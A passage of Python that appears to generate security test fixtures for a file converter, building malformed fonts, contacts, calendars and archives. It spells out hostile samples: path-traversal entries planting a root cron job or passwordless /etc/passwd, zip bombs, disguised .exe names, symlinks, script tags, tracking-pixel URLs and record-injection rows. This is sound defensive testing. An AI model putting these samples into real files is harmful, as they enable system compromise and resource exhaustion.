        summed = data[:8] + b"\0\0\0\0" + data[12:] if tag == b"head" else data
        directory += struct.pack(">4sIII", tag, font_sum(summed), offset, len(data))
        body += data + b"\0" * (-len(data) % 4)
        offset += len(data) + (-len(data) % 4)
    return flavor + struct.pack(">HHHH", len(tables), 0, 0, 0) + directory + body


def woff(tables, flavor=b"\x00\x01\x00\x00", pack=None, said=None, extra=b"") -> bytes:
    """A WOFF from tables. `pack` replaces how a table is compressed; `said` what size it claims."""
    tables = sorted(tables, key=lambda t: t[0])
    offset = 44 + 20 * len(tables)
    directory, body = b"", b""
    for tag, data in tables:
        packed = (pack or {}).get(tag) or zlib.compress(data, 9)
        if tag not in (pack or {}) and len(packed) >= len(data):
            packed = data
        summed = data[:8] + b"\0\0\0\0" + data[12:] if tag == b"head" else data
        directory += struct.pack(">4sIIII", tag, offset, len(packed), (said or {}).get(tag, len(data)), font_sum(summed))
        body += packed + b"\0" * (-len(packed) % 4)
        offset += len(packed) + (-len(packed) % 4)
    total = 44 + len(directory) + len(body) + len(extra)
    header = b"wOFF" + flavor + struct.pack(">IHHIHHIIIII", total, len(tables), 0, 12 + 16 * len(tables), 1, 0, 0, 0, 0, 0, 0)
    return header + directory + body + extra


def patched(data: bytes, at: int, new: bytes) -> bytes:
    return data[:at] + new + data[at + len(new) :]


def font(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


TT = tables_of(TTF)
without = lambda *tags: [t for t in TT if t[0] not in tags]

font(
    "truncated.ttf",
    TTF[: len(TTF) // 2],
    "A TTF cut off half-way, as a download cut short is. Its list of tables points past the end.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "one-byte-changed.ttf",
    patched(TTF, len(TTF) - 40, bytes([TTF[len(TTF) - 40] ^ 0xFF])),
    "A sound TTF with a single byte changed inside one table. The table no longer matches the "
    "checksum the font gives for it.",
    "ttf", node="fails", note=DAMAGED,
)
font(
    "table-outside-the-file.ttf",
    patched(TTF, 12 + 8, struct.pack(">II", 0xFFFFFF00, 0x00010000)),
    "The first table is said to start four gigabytes in and to be sixty-four megabytes long.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "table-is-the-list-itself.ttf",
    patched(TTF, 12 + 8, struct.pack(">I", 4)),
    "A table said to lie inside the list of tables, so that reading it reads the list.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "sixty-five-thousand-tables.ttf",
    patched(TTF, 4, b"\xff\xff"),
    "A font that says it holds 65,535 tables, in a file of a thousand bytes. It is not taken "
    "for a font at all.",
    "unknown",
)
font(
    "no-letters.ttf",
    sfnt(without(b"glyf", b"loca")),
    "Every checksum correct, and no outlines: a font with nothing to draw.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "same-table-twice.ttf",
    patched(sfnt(TT), 12 + 16, sfnt(TT)[12:28]),
    "The list of tables names the same table twice. Which one a reader takes is up to the "
    "reader, and two readers may not agree.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "wrong-magic-number.ttf",
    sfnt([(tag, patched(data, 12, b"\xde\xad\xbe\xef") if tag == b"head" else data) for tag, data in TT]),
    "Checksums all correct, but the number every font carries to say it is a font is another "
    "number.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "first-bytes-only.ttf",
    b"\x00\x01\x00\x00\x00\x01\x00\x10\x00\x00\x00\x00junk" + b"\0" * 12,
    "The bytes a TTF opens with, one table of nothing, and no font.",
    "ttf", node="fails", note=NOT_FONT % "TTF",
)
font(
    "picture-named.ttf",
    GOOD,
    "A PNG with a .ttf name.",
    "png", node="succeeds", mismatch=True,
)
font(
    "words-named.ttf",
    b"This is not a font. It is a sentence.\n",
    "A sentence with a .ttf name.",
    "unknown",
)
font(
    "collection.ttc",
    b"ttcf\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x10" + TTF,
    "Several fonts in one file, which Omsett does not take apart yet.",
    "unregistered",
)

OT = tables_of(OTF)
font(
    "truncated.otf",
    OTF[: len(OTF) // 2],
    "An OTF cut off half-way.",
    "otf", node="fails", note=NOT_FONT % "OTF",
)
font(
    "one-byte-changed.otf",
    patched(OTF, len(OTF) - 40, bytes([OTF[len(OTF) - 40] ^ 0xFF])),
    "A sound OTF with a single byte changed inside one table.",
    "otf", node="fails", note=DAMAGED,
)
font(
    "wrong-outlines-inside.otf",
    sfnt(TT, flavor=b"OTTO"),
    "A file that opens as an OTF does and holds the tables of a TTF: the outlines it promises "
    "are not there.",
    "otf", node="fails", note=NOT_FONT % "OTF",
)
font(
    "ttf-named.otf",
    TTF,
    "A sound TTF with an .otf name. It is converted as the TTF it is.",
    "ttf", node="succeeds", mismatch=True,
)

font(
    "truncated.woff",
    WOFF_[: len(WOFF_) // 2],
    "A WOFF cut off half-way. It says how long it should be, and it is not.",
    "woff", node="fails", note=NOT_FONT % "WOFF",
)
font(
    "something-added-after.woff",
    WOFF_ + b"<script>alert(1)</script>",
    "A sound WOFF with a script added after the font. The file says how long it is, and it is "
    "longer.",
    "woff", node="fails", note=NOT_FONT % "WOFF",
)
font(
    "unpacks-to-far-more.woff",
    woff(TT, pack={b"glyf": zlib.compress(b"\0" * (64 * 1024 * 1024), 9)}),
    "One table is packed from sixty-four megabytes of nothing into sixty kilobytes, and says "
    "it unpacks to a few hundred bytes. Unpacking stops at the size it gave.",
    "woff", node="fails", note=NOT_FONT % "WOFF",
)
font(
    "claims-four-gigabytes.woff",
    woff(TT, said={b"glyf": 0xFFFFFFF0}),
    "One table says it unpacks to four gigabytes. Refused from the figure alone, before "
    "anything is unpacked.",
    "woff", node="fails", note=TOO_BIG,
)
font(
    "unpacks-to-less.woff",
    woff(TT, said={b"glyf": dict(TT)[b"glyf"].__len__() + 400}),
    "One table says it unpacks to more than it does.",
    "woff", node="fails", note=NOT_FONT % "WOFF",
)
font(
    "packing-is-noise.woff",
    woff(TT, pack={b"glyf": bytes(random.Random(7).randrange(256) for _ in range(40))}),
    "One table's packed bytes are noise that unpacks to nothing.",
    "woff", node="fails", note=NOT_FONT % "WOFF",
)
font(
    "table-changed-after-packing.woff",
    woff([(tag, patched(data, 4, b"\xff") if tag == b"hmtx" else data) for tag, data in TT]).replace(
        struct.pack(">I", font_sum(patched(dict(TT)[b"hmtx"], 4, b"\xff"))), struct.pack(">I", font_sum(dict(TT)[b"hmtx"])), 1
    ),
    "A table whose contents were changed and whose checksum was not.",
    "woff", node="fails", note=DAMAGED,
)
font(
    "no-such-kind-of-font.woff",
    woff(TT, flavor=b"evil"),
    "A WOFF that says the font inside is of a kind that does not exist. It is not taken for a "
    "font at all.",
    "unknown",
)
font(
    "postscript-inside.woff",
    woff(OT, flavor=b"OTTO"),
    "A sound WOFF whose letters are drawn as PostScript outlines. Asked for a TTF, which "
    "cannot hold them, Omsett says which format can.",
    "woff", node="fails",
    note="This font has PostScript outlines, so it unwraps to OTF, not TTF. Choose OTF.",
)
font(
    "woff-named.woff2",
    WOFF_,
    "A sound WOFF with a .woff2 name.",
    "woff", node="succeeds", mismatch=True,
)

font(
    "truncated.woff2",
    WOFF2_[: len(WOFF2_) // 2],
    "A WOFF2 cut off half-way.",
    "woff2", node="fails", note=NOT_FONT % "WOFF2",
)
font(
    "packing-damaged.woff2",
    WOFF2_[:-60] + bytes(b ^ 0xFF for b in WOFF2_[-60:-20]) + WOFF2_[-20:],
    "A sound WOFF2 with forty bytes of its packed data inverted.",
    "woff2", node="fails", note=NOT_FONT % "WOFF2",
)
font(
    "claims-four-gigabytes.woff2",
    patched(WOFF2_, 16, b"\xff\xff\xff\xf0"),
    "A WOFF2 whose first lines say the font inside is four gigabytes. The figure is not "
    "believed: the font is unpacked to the size it really is.",
    "woff2", node="succeeds",
)
font(
    "first-bytes-only.woff2",
    b"wOF2" + b"\0" * 60,
    "The four bytes a WOFF2 opens with, and sixty of nothing.",
    "unknown",
)
font(
    "length-lies.woff2",
    patched(WOFF2_, 8, struct.pack(">I", len(WOFF2_) * 1000)),
    "A WOFF2 that says it is a thousand times longer than it is.",
    "woff2", node="fails", note=NOT_FONT % "WOFF2",
)

# --- contacts and calendars: vCard, iCalendar -----------------------------------------------------
# Lines of NAME:value between BEGIN and END. What goes wrong: a BEGIN that is never ended, one
# inside another without limit, values written to break out of their line and start a new
# record, and a table on the way in whose cells were written to do the same on the way out.
# Each is converted to JSON.
G = "contacts"
NOT_CARD = "This file is not valid vCard"
NOT_CAL = "This file is not valid iCalendar"
CRLF = b"\r\n"


def record(name, lines, why, detect, **more):
    trap(name, CRLF.join(lines) + CRLF if isinstance(lines, list) else lines, why, detect, group=G, **more)


CARD = [b"BEGIN:VCARD", b"VERSION:3.0", b"FN:Ada Lovelace", b"EMAIL:ada@example.org", b"END:VCARD"]
EVENT = [b"BEGIN:VEVENT", b"UID:1@example.org", b"DTSTART:20261123T090000Z", b"SUMMARY:Meeting", b"END:VEVENT"]

record(
    "truncated.vcf",
    CARD + [b"BEGIN:VCARD", b"VERSION:3.0", b"FN:Grace Hop"],
    "An address book that stops in the middle of a contact, with no END for it.",
    "vcf", node="fails", note=NOT_CARD,
)
record(
    "contact-inside-a-contact.vcf",
    [b"BEGIN:VCARD", b"FN:Outer"] + CARD + [b"END:VCARD"],
    "One contact opened inside another. Which details belong to whom is anyone's guess.",
    "vcf", node="fails", note=NOT_CARD,
)
record(
    "begins-a-thousand-deep.vcf",
    [b"BEGIN:VCARD"] + [b"BEGIN:X-BOX"] * 1000 + [b"FN:Deep"] + [b"END:X-BOX"] * 1000 + [b"END:VCARD"],
    "A thousand things opened inside one contact, each inside the last.",
    "vcf", node="fails", note=NOT_CARD,
)
record(
    "ended-by-the-wrong-thing.vcf",
    [b"BEGIN:VCARD", b"FN:Ada", b"END:VCALENDAR"],
    "A contact that is opened as a contact and closed as a calendar.",
    "vcf", node="fails", note=NOT_CARD,
)
record(
    "a-line-with-no-colon.vcf",
    [b"BEGIN:VCARD", b"FN:Ada", b"this line is not a property at all", b"END:VCARD"],
    "A line inside a contact that is not a name and a value.",
    "vcf", node="fails", note=NOT_CARD,
)
record(
    "nobody-in-it.vcf",
    [b"BEGIN:VCARD", b"VERSION:3.0", b"END:VCARD"],
    "A contact with no name, no address and no number. It is still a contact, and converts "
    "as an empty one.",
    "vcf", node="succeeds",
)
record(
    "ten-megabyte-photo.vcf",
    [b"BEGIN:VCARD", b"VERSION:3.0", b"FN:Ada Lovelace", b"PHOTO;ENCODING=b;TYPE=JPEG:" + b"QUFB" * 600_000, b"EMAIL:ada@example.org", b"END:VCARD"],
    "A contact carrying a photo of two megabytes on a single line. Photos are left out, so "
    "none of it reaches the result.",
    "vcf", node="succeeds", absent="QUFBQUFB",
)
record(
    "five-thousand-emails.vcf",
    [b"BEGIN:VCARD", b"FN:Ada"] + [b"EMAIL:a%d@example.org" % i for i in range(5000)] + [b"END:VCARD"],
    "One contact with five thousand email addresses, each of which would be a column. Nine "
    "are kept.",
    "vcf", node="succeeds", absent="a4999@example.org",
)
record(
    "folded-forever.vcf",
    [b"BEGIN:VCARD", b"FN:Ada", b"NOTE:start"] + [b" x"] * 200_000 + [b"END:VCARD"],
    "One note continued over two hundred thousand lines.",
    "vcf", node="succeeds",
)
record(
    "formula-in-a-name.vcf",
    [b"BEGIN:VCARD", b"VERSION:3.0", b"FN:=HYPERLINK(\"http://elsewhere.example\"\\,\"Ada\")", b"TEL:+1 (555) 0100", b"NOTE:@SUM(1+1)", b"END:VCARD"],
    "A contact whose name is a spreadsheet formula. To Omsett it is a name and is carried "
    "across as one; the picker warns before it goes into a table.",
    "vcf", node="succeeds",
)
record(
    "picture-named.vcf",
    GOOD,
    "A PNG with a .vcf name.",
    "png", node="succeeds", mismatch=True,
)
record(
    "almost-the-first-line.vcf",
    [b"BEGIN:VCARDS", b"FN:Ada", b"END:VCARDS"],
    "The opening line with one letter too many.",
    "unknown",
)
record(
    "latin-1.vcf",
    "BEGIN:VCARD\r\nFN:Zoë Renée\r\nEND:VCARD\r\n".encode("latin-1"),
    "An address book saved in an older encoding.",
    "unknown",
)
record(
    "contacts-named.csv",
    CARD,
    "A sound address book with a .csv name.",
    "vcf", node="succeeds", mismatch=True,
)

CAL = lambda *inner: [b"BEGIN:VCALENDAR", b"VERSION:2.0", b"PRODID:-//x//EN"] + [l for part in inner for l in part] + [b"END:VCALENDAR"]
record(
    "truncated.ics",
    CAL(EVENT)[:-3],
    "A calendar that stops in the middle of an event.",
    "ics", node="fails", note=NOT_CAL,
)
record(
    "event-outside-a-calendar.ics",
    [b"BEGIN:VCALENDAR", b"END:VCALENDAR"] + EVENT,
    "An event after the calendar has been closed: it belongs to no calendar.",
    "ics", node="fails", note="This file has no events in it",
)
record(
    "event-inside-an-event.ics",
    CAL([b"BEGIN:VEVENT", b"DTSTART:20261123T090000Z", b"SUMMARY:Outer"] + EVENT + [b"END:VEVENT"]),
    "One event opened inside another.",
    "ics", node="fails", note=NOT_CAL,
)
record(
    "no-start.ics",
    CAL([b"BEGIN:VEVENT", b"UID:1", b"SUMMARY:Sometime", b"END:VEVENT"]),
    "An event that does not say when it is.",
    "ics", node="fails", note=NOT_CAL,
)
record(
    "start-is-a-word.ics",
    CAL([b"BEGIN:VEVENT", b"UID:1", b"DTSTART:tomorrow", b"SUMMARY:Soon", b"END:VEVENT"]),
    "An event that starts 'tomorrow'.",
    "ics", node="fails", note=NOT_CAL,
)
record(
    "only-tasks.ics",
    CAL([b"BEGIN:VTODO", b"UID:1", b"SUMMARY:Buy milk", b"END:VTODO"]),
    "A calendar holding a task and no events.",
    "ics", node="fails", note="This file has no events in it",
)
record(
    "alarms-a-thousand-deep.ics",
    CAL([b"BEGIN:VEVENT", b"DTSTART:20261123T090000Z", b"SUMMARY:Deep"] + [b"BEGIN:VALARM"] * 1000 + [b"END:VALARM"] * 1000 + [b"END:VEVENT"]),
    "An event holding a reminder inside a reminder, a thousand times over.",
    "ics", node="fails", note=NOT_CAL,
)
record(
    "repeats-every-second-forever.ics",
    CAL([b"BEGIN:VEVENT", b"UID:1", b"DTSTART:19700101T000000Z", b"RRULE:FREQ=SECONDLY;INTERVAL=1", b"SUMMARY:Tick", b"END:VEVENT"]),
    "An event that repeats every second from 1970 without end. A reader that wrote out each "
    "occurrence would never finish; the rule is kept as a rule, and it is one row.",
    "ics", node="succeeds",
)
record(
    "fetches-from-elsewhere.ics",
    CAL([b"BEGIN:VEVENT", b"UID:1", b"DTSTART:20261123T090000Z", b"SUMMARY:Meeting", b"ATTACH:http://elsewhere.example/track.png",
         b"X-ALT-DESC;FMTTYPE=text/html:<img src=\"http://elsewhere.example/pixel\"><script>alert(1)</script>", b"END:VEVENT"]),
    "An event with an attachment on another site and a description in HTML with a script in "
    "it. Neither is a column Omsett keeps.",
    "ics", node="succeeds", absent="elsewhere.example",
)
record(
    "calendar-named.vcf",
    CAL(EVENT),
    "A sound calendar with a .vcf name.",
    "ics", node="succeeds", mismatch=True,
)
record(
    "picture-named.ics",
    GOOD,
    "A PNG with an .ics name.",
    "png", node="succeeds", mismatch=True,
)

# Tables on the way in, written to break out of the address book or calendar on the way out.
# These are converted to JSON here like any other table; the unit tests take them the other way
# (packages/engines/src/data/cards.test.ts) and show that one row stays one contact.
record(
    "row-that-ends-its-contact.csv",
    b'name,email,note\r\n"Mallory\r\nEND:VCARD\r\nBEGIN:VCARD\r\nFN:Injected",m@example.org,"a;b,c"\r\nAda,ada@example.org,\r\n',
    "A table whose first name holds the lines that end one contact and begin another. As a "
    "table it is a name with line breaks in it.",
    "csv", node="succeeds",
)
record(
    "row-that-ends-its-event.csv",
    b'summary,start,timezone\r\n"x\r\nEND:VEVENT\r\nBEGIN:VEVENT\r\nSUMMARY:Injected",2026-01-01,"Europe/Oslo:1\r\nATTACH:http://elsewhere.example"\r\nReal,2026-01-02,\r\n',
    "A table of events whose first title and time zone hold lines of their own.",
    "csv", node="succeeds",
)

# --- archives: ZIP, TAR, TAR.GZ -------------------------------------------------------------------
# An archive is the classic way to attack whatever opens it. A few kilobytes that unpack to
# gigabytes; a file named to land outside the folder it is unpacked into; a list of contents
# that disagrees with the contents; links that point at the rest of the computer. Each is
# converted to ZIP (a ZIP, to TAR). Nothing here is ever written to a disk by Omsett, but the
# archive it writes will be unpacked by something, so none of this may be carried across.
G = "archives"
import gzip as _gzip
import io as _io

NOT_ZIP, NOT_TAR, NOT_TGZ = ("This file is not a valid %s archive" % n for n in ("ZIP", "TAR", "TAR.GZ"))
ESCAPES = "This archive holds a file named so that it would land outside the folder it is unpacked into"
UNPACKS_TOO_BIG = "This archive unpacks to more than Omsett will handle (256 MB)"
TOO_MANY_FILES = "This archive holds more files than Omsett will handle (10,000)"
SAME_NAME = "This archive holds two files with the same name"
NO_FILES = "This archive has no files in it"
BROKEN_SUM = "This archive is damaged: a file in it does not match its own checksum"


def raw_deflate(data: bytes) -> bytes:
    squeezer = zlib.compressobj(9, zlib.DEFLATED, -15)
    return squeezer.compress(data) + squeezer.flush()


def zip_of(files, comment=b"", count=None, list_at=None):
    """A ZIP built field by field. Each file is a dict; anything not given is written truthfully.

    name, data, and optionally: packed (the stored bytes), method, flags, crc, size (the size the
    list states), mode, local_name (the name in the file's own header), at (where the list says
    the file is)."""
    body, listing, offset = b"", b"", 0
    for f in files:
        name, data = f["name"], f.get("data", b"")
        method = f.get("method", 8)
        packed = f.get("packed", raw_deflate(data) if method == 8 else data)
        crc = f.get("crc", zlib.crc32(data) & 0xFFFFFFFF)
        size = f.get("size", len(data))
        flags = f.get("flags", 0x0800)
        local = struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, flags, method, 0x6000, 0x5B77, crc, len(packed), size, len(f.get("local_name", name)), 0)
        local += f.get("local_name", name)
        listing += struct.pack(
            "<IHHHHHHIIIHHHHHII", 0x02014B50, 0x0314, 20, flags, method, 0x6000, 0x5B77, crc, len(packed), size,
            len(name), 0, 0, 0, 0, (f.get("mode", 0o100644) << 16) & 0xFFFFFFFF, f.get("at", offset),
        ) + name
        body += local + packed
        offset += len(local) + len(packed)
    n = len(files) if count is None else count
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, n, n, len(listing), offset if list_at is None else list_at, len(comment)) + comment
    return body + listing + end


def tar_header(name, size=0, kind=b"0", link=b"", mode=0o644, size_field=None, fix_sum=True):
    block = bytearray(512)
    block[0 : len(name)] = name
    block[100:108] = b"%07o\0" % mode
    block[108:116] = block[116:124] = b"0000000\0"
    block[124:136] = (b"%011o\0" % size) if size_field is None else size_field
    block[136:148] = b"%011o\0" % 1795435200
    block[156:157] = kind
    block[157 : 157 + len(link)] = link
    block[257:265] = b"ustar\x0000"
    block[148:156] = b" " * 8
    if fix_sum:
        block[148:156] = b"%06o\0 " % sum(block)
    return bytes(block)


def tar_of(*members, end=True):
    """Each member is (header, data). The data is padded to a whole block, as TAR requires."""
    out = b""
    for header, data in members:
        out += header + data + b"\0" * (-len(data) % 512)
    return out + (b"\0" * 1024 if end else b"")


def gz(data: bytes) -> bytes:
    out = _io.BytesIO()
    with _gzip.GzipFile(fileobj=out, mode="wb", mtime=0, compresslevel=9) as f:
        f.write(data)
    return out.getvalue()


def arch(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


README = {"name": b"readme.txt", "data": b"An ordinary file.\n"}
FILE = (tar_header(b"readme.txt", 18), b"An ordinary file.\n")
GOOD_ZIP = zip_of([README, {"name": b"docs/notes.md", "data": b"# Notes\n" * 50}])

arch(
    "truncated.zip",
    GOOD_ZIP[: len(GOOD_ZIP) // 2],
    "A ZIP cut off half-way. The list of what it holds is at the end, and the end is gone.",
    "zip", node="fails", note=NOT_ZIP,
)
arch(
    "climbs-out.zip",
    zip_of([README, {"name": b"../../../etc/cron.d/evil", "data": b"* * * * * root sh\n"}]),
    "The best-known attack an archive makes: a file named with ../ so that unpacking it writes "
    "outside the folder, here into the place a computer keeps its scheduled jobs.",
    "zip", node="fails", note=ESCAPES,
)
arch(
    "absolute-path.zip",
    zip_of([README, {"name": b"/etc/passwd", "data": b"root::0:0::/:/bin/sh\n"}]),
    "A file named with a path from the top of the disk.",
    "zip", node="fails", note=ESCAPES,
)
arch(
    "windows-path.zip",
    zip_of([README, {"name": b"..\\..\\Windows\\System32\\evil.dll", "data": b"MZ"}]),
    "The same climb written with backslashes, which only Windows reads as folders. An unpacker "
    "that looks for ../ alone lets it through.",
    "zip", node="fails", note=ESCAPES,
)
arch(
    "drive-letter.zip",
    zip_of([README, {"name": b"C:\\Users\\Public\\evil.bat", "data": b"@echo off\r\n"}]),
    "A file named with a Windows drive letter.",
    "zip", node="fails", note=ESCAPES,
)
arch(
    "climbs-out-invisibly.zip",
    zip_of([README, {"name": (".\u202e./.\u202e./etc/cron.d/evil").encode(), "data": b"* * * * * root sh\n"}]),
    "The same climb with an invisible mark between each pair of dots. A check for .. made "
    "before invisible characters are removed sees nothing wrong; afterwards the name is "
    "../../etc. The check is made on the name as it will be written.",
    "zip", node="fails", note=ESCAPES,
)
arch(
    "climbs-out-with-a-space.zip",
    zip_of([README, {"name": b".. /.. /Windows/evil.dll", "data": b"MZ"}]),
    "Two dots and a space. Windows drops a trailing space from a name, so there this is ..",
    "zip", node="fails", note=ESCAPES,
)
arch(
    "bomb.zip",
    zip_of([{"name": b"zeros.bin", "data": b"\0" * (300 * 1024 * 1024)}]),
    "Three hundred megabytes of nothing, packed into 290 kilobytes. The sizes it gives are "
    "true, and are more than Omsett will unpack; it is refused from the figures alone.",
    "zip", node="fails", note=UNPACKS_TOO_BIG,
)
arch(
    "bomb-that-lies.zip",
    zip_of([{"name": b"small.txt", "data": b"x" * 100, "packed": raw_deflate(b"\0" * (64 * 1024 * 1024)), "crc": 0}]),
    "A file that says it unpacks to a hundred bytes and unpacks to sixty-four megabytes. "
    "Unpacking stops at the size it gave.",
    "zip", node="fails", note=NOT_ZIP,
)
overlap = zip_of([{"name": b"a", "data": b"\0" * 100_000}])
arch(
    "files-that-overlap.zip",
    zip_of([{"name": b"a", "data": b"\0" * 100_000}] + [{"name": b"a", "data": b"\0" * 100_000, "at": 0}] * 999)[
        : len(overlap) - 22 - 47
    ]
    + (struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 0x0314, 20, 0x0800, 8, 0x6000, 0x5B77, zlib.crc32(b"\0" * 100_000), len(raw_deflate(b"\0" * 100_000)), 100_000, 1, 0, 0, 0, 0, 0o100644 << 16, 0) + b"a") * 1000
    + struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, 1000, 1000, 47 * 1000, len(overlap) - 22 - 47, 0),
    "A list of a thousand files that are all the same hundred bytes of the archive. Unpacked "
    "one by one it is a hundred megabytes from a few kilobytes, and the same trick nested has "
    "made petabytes. Two files may not share a byte.",
    "zip", node="fails", note=NOT_ZIP,
)
arch(
    "password.zip",
    zip_of([dict(README, flags=0x0801)]),
    "A ZIP whose files are marked as protected by a password.",
    "zip", node="fails", note="This archive is protected by a password, which Omsett cannot open",
)
arch(
    "packed-another-way.zip",
    zip_of([dict(README, method=14, packed=b"\x5d\x00\x00\x80\x00" + b"\0" * 20)]),
    "A ZIP packed with LZMA, not the usual method.",
    "zip", node="fails", note="This archive is packed in a way Omsett does not read",
)
arch(
    "wrong-checksum.zip",
    zip_of([dict(README, crc=0xDEADBEEF)]),
    "A sound file whose checksum is another file's.",
    "zip", node="fails", note=BROKEN_SUM,
)
arch(
    "ten-thousand-and-one-files.zip",
    zip_of([{"name": b"f%05d" % i, "data": b"", "method": 0} for i in range(10_001)]),
    "Ten thousand and one empty files.",
    "zip", node="fails", note=TOO_MANY_FILES,
)
inner = zip_of([README])
for _ in range(5):
    inner = zip_of([{"name": b"inner.zip", "data": inner}])
arch(
    "zip-inside-zip.zip",
    inner,
    "A ZIP inside a ZIP inside a ZIP, six deep. What is inside an archive is a file and is "
    "carried across as one; it is not opened.",
    "zip", node="succeeds",
)
arch(
    "same-name-twice.zip",
    zip_of([dict(README), dict(README, data=b"A different file with the same name.\n")]),
    "Two files with one name. Which of them a program keeps depends on the program, and that "
    "is how a file is shown to the one that checks and another to the one that runs.",
    "zip", node="fails", note=SAME_NAME,
)
arch(
    "two-names-for-one-file.zip",
    zip_of([{"name": b"safe.txt", "local_name": b"evil.exe", "data": b"MZ\x90\x00"}]),
    "The list at the end calls the file safe.txt and the file's own header calls it evil.exe. "
    "Some programs believe one and some the other.",
    "zip", node="fails", note=NOT_ZIP,
)
arch(
    "name-written-backwards.zip",
    zip_of([README, {"name": "invoice\u202egnp.exe".encode(), "data": b"MZ"}]),
    "A file named with the invisible mark that reverses text, so that invoice[mark]gnp.exe is "
    "shown as invoiceexe.png. The mark is not carried across.",
    "zip", node="succeeds", absent=chr(0xE2) + chr(0x80) + chr(0xAE),
)
arch(
    "link-to-elsewhere.zip",
    zip_of([README, {"name": b"shortcut", "data": b"/etc/passwd", "mode": 0o120777, "method": 0}]),
    "A link, which unpacks as a name pointing at a file elsewhere on the computer. Links are "
    "left out.",
    "zip", node="succeeds", absent="/etc/passwd",
)
arch(
    "script-in-the-comment.zip",
    zip_of([README], comment=b"<script>alert(1)</script>"),
    "A remark attached to the archive, which some programs show when it is opened. Not carried "
    "across.",
    "zip", node="succeeds", absent="<script",
)
arch(
    "very-large-form.zip",
    zip_of([README], count=0xFFFF),
    "A ZIP that says its real list is in the extended form used for archives over four "
    "gigabytes.",
    "zip", node="fails",
    note="This archive is in the ZIP64 form, for very large archives, which Omsett does not read yet",
)
arch(
    "only-folders.zip",
    zip_of([{"name": b"empty/", "data": b"", "method": 0, "mode": 0o040755}, {"name": b"empty/too/", "data": b"", "method": 0, "mode": 0o040755}]),
    "Folders, with no file in any of them.",
    "zip", node="fails", note=NO_FILES,
)
arch(
    "list-is-somewhere-else.zip",
    zip_of([README], list_at=0x7FFFFFF0),
    "The end of the archive says its list of contents starts two gigabytes in.",
    "zip", node="fails", note=NOT_ZIP,
)
arch(
    "picture-named.zip",
    GOOD,
    "A PNG with a .zip name.",
    "png", node="succeeds", mismatch=True,
)

GOOD_TAR = tar_of(FILE, (tar_header(b"docs/", kind=b"5", mode=0o755), b""), (tar_header(b"docs/notes.md", 400), b"# Notes\n" * 50))
arch(
    "truncated.tar",
    GOOD_TAR[:700],
    "A TAR cut off inside its first file. The file's header says how long it is, and there is "
    "not that much left.",
    "tar", node="fails", note=NOT_TAR,
)
arch(
    "climbs-out.tar",
    tar_of(FILE, (tar_header(b"../../../etc/cron.d/evil", 18), b"* * * * * root sh\n")),
    "A file named with ../ so that unpacking it writes outside the folder.",
    "tar", node="fails", note=ESCAPES,
)
arch(
    "absolute-path.tar",
    tar_of(FILE, (tar_header(b"/etc/passwd", 21), b"root::0:0::/:/bin/sh\n")),
    "A file named with a path from the top of the disk.",
    "tar", node="fails", note=ESCAPES,
)
arch(
    "link-then-file-through-it.tar",
    tar_of(FILE, (tar_header(b"logs", kind=b"2", link=b"/etc"), b""), (tar_header(b"notes.txt", 5), b"hello")),
    "A link named logs that points at a system folder. An unpacker that follows it writes "
    "wherever it points. Links are left out; the ordinary files are kept.",
    "tar", node="succeeds", absent="/etc",
)
arch(
    "devices-and-pipes.tar",
    tar_of(FILE, (tar_header(b"disk0", kind=b"4"), b""), (tar_header(b"tty0", kind=b"3"), b""), (tar_header(b"pipe0", kind=b"6"), b""), (tar_header(b"twin", kind=b"1", link=b"readme.txt"), b"")),
    "A disk, a terminal, a pipe and a second name for a file: things an archive can name that "
    "are not files. Only the file is kept.",
    "tar", node="succeeds", absent="disk0",
)
arch(
    "claims-eight-gigabytes.tar",
    tar_of((tar_header(b"big.bin", size_field=b"77777777777\0"), b"x" * 512)),
    "A file said to be eight gigabytes long, in an archive of two kilobytes.",
    "tar", node="fails", note=NOT_TAR,
)
arch(
    "size-beyond-counting.tar",
    tar_of((tar_header(b"big.bin", size_field=b"\x80\0\0\0\x7f\xff\xff\xff\xff\xff\xff\xff"), b"x" * 512)),
    "A size written in the form kept for files past eight gigabytes: here, nine million "
    "terabytes.",
    "tar", node="fails", note=UNPACKS_TOO_BIG,
)
arch(
    "size-is-a-word.tar",
    tar_of((tar_header(b"file.txt", size_field=b"enormous\0\0\0\0"), b"x" * 512)),
    "A header with every sum correct and a word where the size should be.",
    "tar", node="fails", note=NOT_TAR,
)
arch(
    "header-sum-wrong.tar",
    tar_of((tar_header(b"readme.txt", 18)[:148] + b"0000000\0" + tar_header(b"readme.txt", 18)[156:], b"An ordinary file.\n")),
    "A TAR whose first header does not add up. TAR has no signature but that sum, and a header "
    "that fails it is not believed.",
    "tar", node="fails", note=NOT_TAR,
)
pax = b"36 path=../../../etc/cron.d/evil\n"
arch(
    "long-name-climbs-out.tar",
    tar_of(FILE, (tar_header(b"PaxHeader/x", len(pax), kind=b"x"), pax), (tar_header(b"innocent.txt", 5), b"hello")),
    "A file with an innocent name, and before it a note in the newer style that gives it "
    "another: one that climbs out of the folder. The note is what counts.",
    "tar", node="fails", note=ESCAPES,
)
arch(
    "older-long-name-climbs-out.tar",
    tar_of(FILE, (tar_header(b"././@LongLink", 13, kind=b"L"), b"/etc/shadow\0\0"), (tar_header(b"innocent.txt", 5), b"hello")),
    "The same with the older way of writing a long name.",
    "tar", node="fails", note=ESCAPES,
)
arch(
    "file-with-holes.tar",
    tar_of(FILE, (tar_header(b"sparse.img", 512, kind=b"S"), b"\0" * 512)),
    "A file stored as a map of where its contents are, a form used for disk images.",
    "tar", node="fails", note="This archive holds a file stored in a way Omsett does not read",
)
arch(
    "same-name-twice.tar",
    tar_of(FILE, (tar_header(b"./readme.txt", 5), b"other")),
    "Two files that are the same file by two spellings of its name.",
    "tar", node="fails", note=SAME_NAME,
)
arch(
    "no-end-marker.tar",
    tar_of(FILE, end=False),
